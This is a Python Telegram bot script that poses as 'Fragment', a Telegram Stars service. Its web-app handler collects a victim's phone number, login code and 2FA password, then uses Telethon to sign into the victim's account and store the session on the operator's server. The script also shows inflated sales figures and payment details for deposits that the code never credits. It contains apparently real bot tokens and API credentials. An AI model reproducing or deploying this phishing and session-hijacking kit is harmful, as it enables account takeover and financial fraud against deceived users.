import asyncio
import logging
import random
import sqlite3
import secrets
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError,
    FloodWaitError
)

# ========== КОНФИГУРАЦИЯ ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
ADMIN_ID    = 174415647

API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"

# ========== КАСТОМНЫЕ ЭМОДЗИ (PREMIUM) ==========
def e(doc_id: str) -> str:
    """Возвращает кастомное премиум эмодзи по ID"""
    return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'

# Коллекция кастомных эмодзи (из твоего списка)
EMOJI = {
    "user":       e("5199552030615558774"),
    "star":       e("5267500801240092311"),
    "shield":     e("5197434882321567830"),
    "gift":       e("5197369495739455200"),
    "lock":       e("5197161121106123533"),
    "money":      e("5278467510604160626"),
    "diamond":    e("5264713049637409446"),
    "card":       e("5445353829304387411"),
    "rocket":     e("5444856076954520455"),
    "fire":       e("5303138782004924588"),
    "bell":       e("5312361253610475399"),
    "trophy":     e("5332455502917949981"),
    "check":      e("5274055917766202507"),
    "gem":        e("5258203794772085854"),
    "clock":      e("5429651785352501917"),
    "crystal":    e("5195033767969839232"),
    "chart":      e("5382194935057372936"),
    "spark":      e("5902449142575141204"),
    "warning":    e("5447644880824181073"),
    "wallet":     e("5893382531037794941"),
    "bank":       e("5238132025323444613"),
    "banknote":   e("5201873447554145566"),
    "link":       e("5902449142575141204"),
    "shine":      e("5235630047959727475"),
    "tonkeeper":  e("5397829221605191505"),
    "top_medal":  e("5188344996356448758"),
    "stars_deal": e("5321485469249198987"),
    "security":   e("5197288647275071607"),
    "stats":      e("5028746137645876535"),
    "requisites": e("5242631901214171852"),
    "cryptobot":  e("5242606681166220600"),
    "welcome":    e("5251340119205501791"),
    "balance":    e("5424976816530014958"),
    "pencil":     e("5197371802136892976"),
    "safe":       e("5262517101578443800"),
    "medal":      e("5463289097336405244"),
    "handshake":  e("5287231198098117669"),
    "pin":        e("5893297890117292323"),
    "target":     e("5893081007153746175"),
    "num1":       e("5794164805065514131"),
    "num2":       e("5794085322400733645"),
    "num3":       e("5794280000383358988"),
    "num4":       e("5794241397217304511"),
    "store":      e("4988289890769699938"),
    "photo":      e("5197521015321808897"),
    "hourglass":  e("5197453929637381812"),
}

# ========== ТВОИ ОРИГИНАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
SBP_PHONE   = "89041751408"
SBP_BANK    = "ВТБ — Александр Ф."
TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"

SHOP_STAR_PRICE_RUB = 1.1
SHOP_MIN_STARS      = 50
TOTAL_STARS_BOUGHT  = 6_385_921
STAR_TO_USD         = 0.013
TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)

# ========== ИНИЦИАЛИЗАЦИЯ ==========
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            auth_code TEXT,
            code_expires TIMESTAMP,
            is_authorized BOOLEAN DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            step TEXT,
            twofa_password TEXT,
            session_expires TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()
os.makedirs("sessions", exist_ok=True)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def generate_code() -> str:
    return f"{random.randint(10000, 99999)}"

def save_auth_session(user_id: int, phone: str, step: str = "phone"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    expires = datetime.now() + timedelta(minutes=30)
    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                   (user_id, phone, step, expires))
    conn.commit()
    conn.close()

def get_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT phone, step, twofa_password, session_expires FROM auth_sessions WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row and datetime.fromisoformat(row[3]) > datetime.now():
        return {"phone": row[0], "step": row[1], "twofa": row[2]}
    return None

def clear_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def authorize_user(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_authorized = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

user_clients = {}

# ========== КОМАНДЫ ==========
@dp.message(CommandStart())
async def cmd_start(message: Message):
    webapp_url = "https://ваш-домен/index.html"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{EMOJI['star']} Открыть Fragment {EMOJI['star']}", web_app=WebAppInfo(url=webapp_url))]
    ])
    await message.answer(
        f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
        f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
        f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
        f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
        f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(f"{EMOJI['warning']} Нет доступа {EMOJI['warning']}")
        return
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
    authorized = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total = cursor.fetchone()[0]
    conn.close()
    
    await message.answer(
        f"{EMOJI['chart']} <b>{EMOJI['stats']} СТАТИСТИКА FRAGMENT {EMOJI['stats']}</b> {EMOJI['chart']}\n\n"
        f"{EMOJI['user']} <b>Всего пользователей:</b> <code>{total}</code> {EMOJI['user']}\n"
        f"{EMOJI['check']} <b>Авторизовано:</b> <code>{authorized}</code> {EMOJI['check']}\n"
        f"{EMOJI['star']} <b>Всего звёзд:</b> <code>{TOTAL_STARS_BOUGHT:,}</code> {EMOJI['star']}\n"
        f"{EMOJI['money']} <b>Общая сумма:</b> <code>${TOTAL_USD:,} USD</code> {EMOJI['money']}\n"
        f"{EMOJI['diamond']} <b>Курс:</b> <code>1 ⭐ = ${STAR_TO_USD}</code> {EMOJI['diamond']}\n\n"
        f"{EMOJI['spark']} <i>Fragment — твой путь к звёздам!</i> {EMOJI['spark']}",
        parse_mode="HTML"
    )

# ========== ОБРАБОТКА WEBAПП ==========
@dp.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    data = message.web_app_data.data
    user_id = message.from_user.id
    
    logger.info(f"{EMOJI['spark']} Получены данные от {user_id}: {data[:100]}... {EMOJI['spark']}")
    
    try:
        import json
        payload = json.loads(data)
        action = payload.get("action")
        
        if action == "send_code":
            phone = payload.get("phone")
            if not phone:
                await message.answer(f"{EMOJI['warning']} Не указан номер телефона {EMOJI['warning']}")
                return
            
            save_auth_session(user_id, phone, "phone")
            await message.answer(f"{EMOJI['rocket']} Отправляю код на номер {phone}... {EMOJI['rocket']}")
            
            try:
                client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                await client.connect()
                await client.send_code_request(phone)
                user_clients[user_id] = client
                
                await message.answer(
                    f"{EMOJI['check']} <b>Код отправлен на {phone}</b> {EMOJI['check']}\n\n"
                    f"{EMOJI['lock']} Введите код в мини-приложении (5 цифр) {EMOJI['lock']}\n"
                    f"{EMOJI['clock']} Код действителен 5 минут {EMOJI['clock']}\n\n"
                    f"{EMOJI['spark']} <i>Проверьте личные сообщения от бота!</i> {EMOJI['spark']}",
                    parse_mode="HTML"
                )
            except PhoneNumberInvalidError:
                await message.answer(f"{EMOJI['warning']} Неверный формат номера телефона {EMOJI['warning']}")
                clear_auth_session(user_id)
            except FloodWaitError as e:
                await message.answer(f"{EMOJI['clock']} Слишком много попыток. Подождите {e.seconds} сек. {EMOJI['clock']}")
                clear_auth_session(user_id)
        
        elif action == "check_code":
            code = payload.get("code")
            session = get_auth_session(user_id)
            if not session or session["step"] != "code":
                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}")
                return
            
            client = user_clients.get(user_id)
            if not client:
                await message.answer(f"{EMOJI['warning']} Сессия не найдена. {EMOJI['warning']}")
                return
            
            try:
                await client.sign_in(session["phone"], code)
                await message.answer(
                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                    f"{EMOJI['user']} Вы вошли в аккаунт <b>{session['phone']}</b> {EMOJI['user']}\n\n"
                    f"{EMOJI['welcome']} <b>Добро пожаловать в Fragment!</b> {EMOJI['welcome']}\n"
                    f"{EMOJI['safe']} <i>Сессия сохранена</i> {EMOJI['safe']}",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)
            except SessionPasswordNeededError:
                await message.answer(
                    f"{EMOJI['lock']} <b>{EMOJI['shield']} ТРЕБУЕТСЯ ПАРОЛЬ 2FA {EMOJI['shield']}</b> {EMOJI['lock']}\n\n"
                    f"Введите пароль в мини-приложении",
                    parse_mode="HTML"
                )
            except PhoneCodeInvalidError:
                await message.answer(f"{EMOJI['warning']} Неверный код. Попробуйте ещё раз. {EMOJI['warning']}")
        
        elif action == "check_2fa":
            password = payload.get("password")
            session = get_auth_session(user_id)
            if not session or session["step"] != "2fa":
                await message.answer(f"{EMOJI['warning']} Сессия истекла. {EMOJI['warning']}")
                return
            
            client = user_clients.get(user_id)
            if not client:
                await message.answer(f"{EMOJI['warning']} Сессия не найдена. {EMOJI['warning']}")
                return
            
            try:
                await client.sign_in(password=password)
                me = await client.get_me()
                await message.answer(
                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                    f"{EMOJI['user']} <b>Вы вошли в аккаунт:</b> {EMOJI['user']}\n"
                    f"👤 <b>Имя:</b> {me.first_name} {me.last_name or ''}\n"
                    f"📱 <b>Номер:</b> <code>{me.phone}</code>\n"
                    f"🔹 <b>Username:</b> @{me.username or 'нет'}\n\n"
                    f"{EMOJI['welcome']} <b>Добро пожаловать в Fragment!</b> {EMOJI['welcome']}\n"
                    f"{EMOJI['spark']} <i>Твой путь к звёздам начинается здесь!</i> {EMOJI['spark']}",
                    parse_mode="HTML"
                )
                authorize_user(user_id)
                clear_auth_session(user_id)
            except Exception as e:
                await message.answer(f"{EMOJI['warning']} Неверный пароль 2FA {EMOJI['warning']}")
        
        elif action == "withdraw":
            amount = payload.get("amount")
            await message.answer(
                f"{EMOJI['money']} <b>{EMOJI['stars_deal']} ЗАЯВКА НА ВЫВОД {EMOJI['stars_deal']}</b> {EMOJI['money']}\n\n"
                f"{EMOJI['star']} <b>Сумма:</b> <code>{amount} ⭐</code> {EMOJI['star']}\n"
                f"{EMOJI['clock']} <b>Статус:</b> <i>обрабатывается</i> {EMOJI['clock']}\n\n"
                f"{EMOJI['spark']} <i>Вывод обычно занимает до 10 минут</i> {EMOJI['spark']}",
                parse_mode="HTML"
            )
        
        elif action == "deposit":
            method = payload.get("method")
            await message.answer(
                f"{EMOJI['card']} <b>{EMOJI['banknote']} ПОПОЛНЕНИЕ БАЛАНСА {EMOJI['banknote']}</b> {EMOJI['card']}\n\n"
                f"🔹 <b>Метод:</b> <code>{method}</code>\n"
                f"{EMOJI['star']} <b>Мин. сумма:</b> <code>{SHOP_MIN_STARS} ⭐</code>\n"
                f"{EMOJI['money']} <b>Курс:</b> <code>1 ⭐ = {SHOP_STAR_PRICE_RUB} RUB</code>\n\n"
                f"{EMOJI['requisites']} <b>Реквизиты:</b>\n"
                f"🏦 <b>СБП:</b> <code>{SBP_PHONE}</code> ({SBP_BANK})\n"
                f"{EMOJI['tonkeeper']} <b>TON:</b> <code>{TON_ADDRESS[:20]}...</code>\n"
                f"{EMOJI['cryptobot']} <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Перейти</a>\n\n"
                f"{EMOJI['spark']} <i>После оплаты звёзды зачислятся автоматически</i> {EMOJI['spark']}",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")

# ========== ЗАПУСК ==========
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info(f"{EMOJI['crystal']} Бот Fragment запущен с кастомными премиум эмодзи {EMOJI['crystal']}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
